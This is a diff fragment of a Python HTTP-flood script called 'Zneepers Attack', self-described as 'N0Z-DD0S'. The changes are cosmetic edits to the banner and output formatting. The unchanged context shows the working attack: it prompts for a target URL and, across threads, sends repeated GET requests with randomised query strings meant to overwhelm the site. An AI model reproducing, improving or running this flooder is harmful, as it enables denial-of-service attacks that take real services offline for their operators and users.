@@ -40,7 +40,7 @@ print("\033[96m             •  •   •   •   •      •  •  •    •
 print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")     
 print("\033[1m             Z  N  E  E  P  E  R  S    A  T  T  A  C  K                    \033[0m")    
 print("\033[33m                         design By: ZA'99                                 \033[0m")   
-print("\033[1m                     —°0  please use wisely  0°—                           \033[0m")    
+print("\033[1m                   —°0  please use wisely  0°—                           \033[0m")    
 print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")      
 print("\033[32m-------------------------------->>>\033[0m")
 url = input("URL:  ").strip()
@@ -88,7 +88,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0}\033[93mN0Z-DD0S  [\033[4mREQUEST SEND TO  [\033[33m" +url+ " \033[0m".format(count))
+                print ("{0}\033[93mN0Z-DD0S  |\033[4mREQUEST SEND TO  |\033[33m" +url+ " |\033[0m".format(count))
             except requests.exceptions.ConnectionError:
                 
                 
